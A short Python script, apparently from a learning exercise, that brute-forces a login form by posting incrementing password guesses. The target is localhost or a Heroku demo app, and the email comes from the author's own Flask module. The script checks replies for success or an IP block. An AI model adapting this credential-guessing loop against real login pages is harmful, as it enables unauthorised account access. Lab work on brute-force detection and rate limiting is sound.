#!/usr/bin/env python3

' Performs brute-force attacks against the target '

import requests
import time
import sys
from flask_app import var

try:
    if sys.argv[1]:
        url = 'http://localhost:8080/'  # test on localhost
except Exception:
    url = 'http://brutefo.herokuapp.com/'

print(url[7:-1])

headers = {'User-Agent': 'Mozilla'}
data = {
    'email': var.email,  # imported from flask_app
    'password': var.password
}
sess = requests.Session()
sess.headers['User-Agent'] = 'Mozilla'


def try_password(trial=''):
    ' Send POST request attempt with password '
    try:
        data['password'] = ''.join(trial)
        print(data['password'])
        res = sess.post(url, data=data)
        if 'success' in res.text:  # if brute-force successful
            return 'Success'
        elif 'block' in res.text:  # IP is blocked by server
            return 'IP blocked'
    except Exception:
        pass  # if fail to post, retry
    return ''  # empty string if failed


def main():
    ' Perform Brute force attack '
    password = '.5_pFO*p6s8Kcj+P'
    password = list(password)
    for attempt in range(10):
        res = try_password(password)
        if res:  # if there is response, stop attack
            print(res)
            break
        if password[-1] is '~':  # last char can't be increased
            password[-1] = '!'
            if password[-2] is '~':
                pass
            else:
                password[-2] = chr(ord(password[-2]) + 1)
        else:
            password[-1] = chr(ord(password[-1]) + 1)  # increase last character
        time.sleep(1)  # wait for 1 second before next attempt


if __name__ == '__main__':
    main()


'''
Note:
for x in range(150):
    print(x, chr(x))

Characters which can be in password
33 !  to 126 ~
'''